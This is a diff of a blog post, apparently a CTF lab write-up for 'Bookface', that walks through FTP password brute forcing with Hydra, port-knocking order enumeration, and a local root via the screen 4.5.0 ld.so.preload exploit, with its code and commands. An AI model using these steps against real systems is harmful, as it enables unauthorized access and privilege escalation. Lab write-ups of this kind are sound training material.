@@ -2,8 +2,17 @@
 title: "Bookface"
 date: 2020-02-10T14:50:43+01:00
 draft: true
+tags: ["CTF"]
 ---
 
+Before we start, read more about following tools & vulnerabilities. It will contains in this CTF
+- [hydra](https://www.cyberpunk.rs/password-cracker-thc-hydra)
+- [screen](https://www.gnu.org/software/screen/) - [CVE-2017-5618](https://www.cvedetails.com/cve/CVE-2017-5618/)
+- [knock](https://linux.die.net/man/1/knock)
+
+and also you can read more about additional security method called [port knocking](https://www.howtogeek.com/442733/how-to-use-port-knocking-on-linux-and-why-you-shouldnt/)
+
+So let's start as usual with __nmap__.
 ```bash
 nmap -F --top-ports 10 -sV 10.10.219.90
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 16:37 CET
@@ -28,6 +37,9 @@ PORT     STATE  SERVICE        VERSION
 445/tcp  open   microsoft-ds?
 3389/tcp open   ms-wbt-server?
 ```
+
+After scan, we can see many ports open, but only from FTP we have grabbed banner *vsftpd 2.0.8 or later*. 
+From description of this game we know the developer's name: *Jerry*, so we can try brute force attack to FTP server.
 
 ```bash
 $ hydra -ljerry -P /usr/share/dict/rockyou.txt ftp://10.10.219.90 -t 16  -vV                                        
@@ -56,6 +68,10 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-02-10 16:28:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-02-10 16:28:01    
 ```
 
+![Many hours later](https://i.kym-cdn.com/photos/images/original/000/401/463/ee2.png "Many hours later")
+
+And voilà, we have a password: __prumpy__.
+Connect to FTP with jerry:prumpy and let's find out what is hide inside.
 
 ```bash
 $ ftp 10.10.219.90 
@@ -86,11 +102,15 @@ ftp> get note
 226 Transfer complete.
 141 bytes received in 0.000263 seconds (524 kbytes/s)
 ```
+
+Two files, first with flag, the second with some interesting notes.
+
 ```bash
 $ cat flag1
 79eb173ecb02d12d6d4832881be2cf23
 ```
-__FLAG1: 79eb173ecb02d12d6d4832881be2cf23__
+
+- __FLAG1: 79eb173ecb02d12d6d4832881be2cf23__
 
 ```bash
 $ cat note
@@ -100,6 +120,10 @@ Can you signup and like my doggo photos?
 
 Thanks
 ```
+
+Ouu, there is also some domain, lets look on it, if we can find there something interesting.
+After couple of requests to different types of DNS records, I found the the right one. 
+In TXT record there are flag and also some ports, but wait. Why was there so many ports open?
 
 ```bash
 host -t txt bookface.com 10.10.219.90                   
@@ -112,7 +136,10 @@ bookface.com descriptive text "Ports: 6786 9893 8748 3443 - Who cares about orde
 bookface.com descriptive text "Flag2:a17f17ba86d8271da60ed8436667f412"
 ```
 
-__FLAG2: a17f17ba86d8271da60ed8436667f412__
+- __FLAG2: a17f17ba86d8271da60ed8436667f412__
+
+It looks like port knocking now. But according to comment we don't know order of ports, 
+so I wrote port-knocking-enumeration to brute force the order.
 
 source: port-knocking-enumeration.sh
 ```bash
@@ -137,6 +164,7 @@ for a in ${porta[@]}; do
 done
 ```
 
+Let's brute force it!
 
 ```bash
 $ ./port-knocking-enumeration.sh 
@@ -173,6 +201,8 @@ $ ./port-knocking-enumeration.sh
 [SUCCESS!!] 8748 9893 6786 3443
 ```
 
+Now we have the right order! We can verify it..
+
 ```bash
 $ knock 10.10.213.66 8748 9893 6786 3443 && nmap -sV -p22 10.10.213.66
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 19:55 CET
@@ -186,6 +216,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds
 ```
+
+aand connect to ssh. Password is same as on FTP of course ;)
 
 ```bash
 $ knock 10.10.213.66 8748 9893 6786 3443 && ssh jerry@10.10.213.66
@@ -222,6 +254,9 @@ applicable law.
 Last login: Sat Feb 23 22:17:39 2019 from 10.0.0.20
 jerry@ip-10-10-213-66:~$ 
 ```
+
+We're in, so let's find another flag.
+
 ```bash
 jerry@ip-10-10-213-66:/home$ find / -name "flag3" 2>/dev/null
 /home/flag3
@@ -229,7 +264,11 @@ jerry@ip-10-10-213-66:/home$ cat /home/flag3
 dd059316033c59f00057e5552140f831
 ```
 
-__FLAG3: dd059316033c59f00057e5552140f831__
+- __FLAG3: dd059316033c59f00057e5552140f831__
+
+Okey, that was pretty easy, but for the last one flag we will need the root priviledges.
+So how to find vulnerability to gain the root priviledges? Let's search some binaries with
+[setuid bit flag](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits).
 
 ```bash
 jerry@ip-10-10-140-162:/etc$ find / -perm -u=s -type f 2>/dev/null
@@ -253,7 +292,15 @@ jerry@ip-10-10-140-162:/etc$ find / -perm -u=s -type f 2>/dev/null
 /bin/mount
 ```
 
+only *screen* has a version in a name of file and that's interesting. 
+We can look at the internet and find the exploit if exists. 
+The best way how to find the correct exploit and not malware :) 
+is on [exploit-db](https://www.exploit-db.com) website from offensive-security.
+
+I found one that could works. 
 [exploit](https://www.exploit-db.com/exploits/41154)
+
+
 ```bash
 $ cat << EOF > /tmp/libhax.c
 #include <stdio.h>
@@ -267,9 +314,10 @@ void dropshell(void){
     printf("[+] done!\n");
 }
 EOF
-6  gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c                                                      
-    7  ls /tmp/                                          
-    8  cat << EOF > /tmp/rootshell.c                                                                               
+
+$ gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c                                                      
+$ ls /tmp/                                          
+$ cat << EOF > /tmp/rootshell.c                                                                               
 #include <stdio.h>                                       
 int main(void){                                          
     setuid(0);                                           
@@ -280,16 +328,21 @@ int main(void){
 }        
 EOF    
                             
-    9  gcc -o /tmp/rootshell /tmp/rootshell.c
-   10  cd /etc/
-   11  umask 000
-   12  screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"                                                
-   13  /bin/screen-4.5.0/screen-4.05.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"                       
-   15  /tmp/rootshell 
+$ gcc -o /tmp/rootshell /tmp/rootshell.c
+$ cd /etc/
+$ umask 000
+$ screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"                                                
+$ /bin/screen-4.5.0/screen-4.05.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"                       
+$ /tmp/rootshell 
 ```
+And now we have root priviledges, so let's take the last one flag.
+
 ```bash
 # cat /root/flag4
 6b873b86b1f3eb170554af54fddb8267
 ```
 
-__FLAG4: 6b873b86b1f3eb170554af54fddb8267__
+- __FLAG4: 6b873b86b1f3eb170554af54fddb8267__
+
+I hope you enjoy the game and learn something new.
+Bye;)
